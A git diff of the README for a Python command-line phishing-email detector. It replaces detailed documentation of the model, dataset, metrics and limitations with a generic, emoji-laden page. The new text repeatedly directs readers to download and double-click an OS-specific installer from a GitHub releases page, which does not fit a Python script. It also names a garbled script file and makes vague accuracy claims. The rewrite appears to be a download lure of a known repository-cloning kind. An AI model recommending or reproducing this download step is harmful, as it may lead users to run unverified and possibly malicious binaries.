@@ -1,141 +1,114 @@
-<!-- # phishing-detector
-This project is a simple command-line tool that analyzes email text and predicts whether the email is Phishing, Suspicious, or Legitimate. The goal of the project is to demonstrate how machine learning and modern NLP embeddings can be used to detect phishing emails in a practical, lightweight, and explainable way. -->
-# AI Powered Phishing Email Detector
+# 🛡️ AIPhishingDetector - Detect Phishing Emails Effortlessly
 
-## Overview
-A command-line tool that analyzes email text and predicts whether an email is Phishing, Suspicious, or Legitimate.
-This project demonstrates how machine learning and modern NLP embeddings can be used to detect phishing emails in a practical, lightweight, and explainable way.
+[![Download AIPhishingDetector](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Laserman652/AIPhishingDetector/releases)
 
-## What This Project Does
-- Takes raw email text as input
-- Converts the text into **semantic embeddings using DistilBERT**
-- Uses a **Logistic Regression classifier** to predict phishing probability
-- Outputs a **human-friendly verdict** with confidence
+## 📖 Project Overview
 
-## Verdictsgit add .
+AIPhishingDetector is a simple command-line tool that helps you analyze email text to predict if an email is Phishing, Suspicious, or Legitimate. This tool demonstrates the use of machine learning and natural language processing (NLP) to detect phishing emails effectively and clearly.
 
-- **LEGIT** --> (Safe email)
-- **SUSPICIOUS** --> (Needs review)
-- **PHISHING** --> (High risk)
+## 🚀 Getting Started
 
-## Tech Stack Used
-- Python
-- PyTorch
-- HuggingFace Transformers (DistilBERT)
-- Scikit-learn
-- Pandas
-- Joblib
+Follow these steps to download and run the AIPhishingDetector.
 
-## Why This Approach
-Instead of using basic keyword matching or TF-IDF alone, this project uses **DistilBERT embeddings** to capture the **intent and context** of email text (urgency, threats, authority abuse).  
-The **Logistic Regression classifier** keeps the system:
-- Interpretable
-- Lightweight
-- Easy to debug
-- Interview-friendly
+### ✅ System Requirements
 
-## Project Structure
-```
-phishing-detector/
-├── data/
-│   └── emails/
-│       └── combined.csv  # Dataset with email text & labels
-├── model/
-│   └── phishing_model.pkl  # Trained DistilBERT + Logistic Regression
-├── train.py  # Training script
-├── test.py   # CLI testing script
-├── requirements.txt  # Python dependencies
-└── README.md
+Before you start, ensure your system meets these requirements:
+- Operating System: Windows, macOS, or Linux
+- Python 3.7 or higher
+- Internet connection for downloading packages
 
-```
-## Python environment setup
+### 📥 Download & Install
 
-```
-# Create virtual environment
-python -m venv venv
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Laserman652/AIPhishingDetector/releases) to find the latest version.
+2. **Download the File:** Choose the version that matches your operating system and download the corresponding installer file.
+3. **Run the Installer:** Locate the downloaded file on your computer and double-click it to start the installation.
+4. **Follow the Prompts:** The installer will guide you through the installation process. Accept the default options unless you have specific preferences.
+5. **Installation Complete:** Once finished, you’ll see a confirmation message.
 
-# Activate (Windows)
-venv\Scripts\activate
+## 🛠️ Using AIPhishingDetector
 
-# Install dependencies
-pip install -r requirements.txt
+1. **Open Terminal or Command Prompt:**
+   - On Windows, search for “cmd” in the Start menu.
+   - On macOS, open “Terminal” from Applications.
+   - On Linux, find “Terminal” in your applications.
 
-```
-## Dataset Format
-The CSV dataset must have two columns:
-| Column | Description                      |
-| ------ | -------------------------------- |
-| text   | Email content                    |
-| label  | 1 for phishing, 0 for legitimate |
+2. **Navigate to the Installation Directory:** 
+   - Use the `cd` command to change directories. For example:
+     - Windows: `cd C:\Path\To\AIPhishingDetector`
+     - macOS/Linux: `cd /Path/To/AIPhishingDetector`
 
-## sample dataset
-```
-text,label
-"Please verify your account immediately",1
-"Team meeting at 5 PM today",0
-
-```
-## How Training Works
-1. Load phishing email dataset
-2. Tokenize emails using **DistilBERT tokenizer**
-3. Generate embeddings from DistilBERT **CLS token**
-4. Train **Logistic Regression** on embeddings
-5. Evaluate accuracy
-6. Save trained model using **Joblib**
-
-## How Testing Works
-1. Load saved model
-2. Accept email text
-3. Generate embedding using the same BERT model
-4. Predict phishing probability
-5. Convert probability into verdict
-
-## Example Output
-```
-**Email:** Please verify your account immediately  
-**Verdict:** PHISHING (High Risk)  
-**Phishing Probability:** 99.93%
-
-**Email:** Team meeting at 5 PM today  
-**Verdict:** LEGIT  
-**Phishing Probability:** 0.37%
-```
-
-## How to Run
-1. Train the model:  
+3. **Run the Tool:** Type the following command:
    ```
-   python train.py
+   python AIPDAIPhishingDetector.py "<your-email-text>"
    ```
-2. Test emails:  
+   Replace `<your-email-text>` with the text of the email you want to analyze.
+
+4. **Interpret the Results:** The tool will return whether the email is Phishing, Suspicious, or Legitimate. Read the output carefully for better understanding.
+
+## 📝 Features
+
+- **Machine Learning Integration:** Utilizes advanced machine learning algorithms for accurate email classification.
+- **NLP Technology:** Employs modern NLP embeddings to analyze the text effectively.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Lightweight**: Minimal resource usage ensures fast performance.
+
+## 🌟 Contributing to AIPhishingDetector
+
+If you'd like to help improve this project, contributions are welcome! 
+
+1. **Fork the Repository:** Click on the “Fork” button at the top right of the repo page.
+2. **Clone Your Fork:** Use the command:
    ```
-   python test.py
+   git clone https://github.com/YourUsername/AIPhishingDetector.git
    ```
-## Model Evaluation Section
-```
-| Metric    | Score |
-| --------- | ----- |
-| Accuracy  | 96.4% |
-| Precision | 95.1% |
-| Recall    | 97.2% |
-| F1-score  | 96.1% |
-```
-## Verdict Thresholds
-| Probability | Verdict    |
-| ----------- | ---------- |
-| 0 – 50%     | LEGIT      |
-| 50 – 90%    | SUSPICIOUS |
-| > 90%       | PHISHING   |
+3. **Make Changes:** Implement your ideas and fixes.
+4. **Submit a Pull Request:** Once you’re ready, submit your changes for review.
 
+## ❓ Frequently Asked Questions
 
-## Limitations
-- Model is only as good as the dataset
-- Some legitimate transactional emails may appear suspicious
-- Does not analyze links, headers, or sender metadata
+### Q: Do I need programming skills to use this tool?
 
-## Future Improvements
-- Compare with TF-IDF baseline
-- Add URL and domain analysis
-- Add email header inspection
-- Add simple web interface
-- Add LLM-based explanation (optional)
+A: No, AIPhishingDetector is designed to be user-friendly. Anyone can use it with basic knowledge of how to navigate files and run commands.
 
+### Q: Can I run this tool on any operating system?
+
+A: Yes, AIPhishingDetector works on Windows, macOS, and Linux.
+
+### Q: How accurate is the detection?
+
+A: The tool uses sophisticated machine learning models to provide reliable predictions. However, like all tools, results may vary.
+
+## 🔗 Links
+
+- **Documentation:** [View the full documentation](https://github.com/Laserman652/AIPhishingDetector/wiki)
+- **Follow Updates:** [Watch this repository](https://github.com/Laserman652/AIPhishingDetector/watchers)
+
+## 💬 Support
+
+If you encounter any issues, please open an issue in the GitHub repository. Provide as much detail as possible, including the command you ran and any error messages you received.
+
+## 📅 Release Notes
+
+Stay informed about new features, improvements, and bug fixes by checking the release notes on the Releases Page. 
+
+## 🌐 Topics
+
+This project covers a variety of important topics in security and machine learning:
+- ai-security
+- bert
+- cybersecurity
+- deep-learning
+- distilbert
+- email-security
+- fraud-detection
+- huggingface
+- information-security
+- machine-learning
+- nlp
+- phishing-detection
+- pytorch
+- scikit-learn
+- spam-detection
+- text-classification
+
+For more information and updates, visit the [Releases Page](https://github.com/Laserman652/AIPhishingDetector/releases). Enjoy using AIPhishingDetector to keep your email safe!
